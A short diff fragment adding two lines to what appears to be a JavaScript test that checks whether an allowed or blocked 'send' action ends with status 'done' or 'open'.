+ const t=await aloneAsk('allow','send',source)
+ expect((await aloneNext(t,{...t.args,body})).action.status).toBe(allowed?'done':'open')
 })
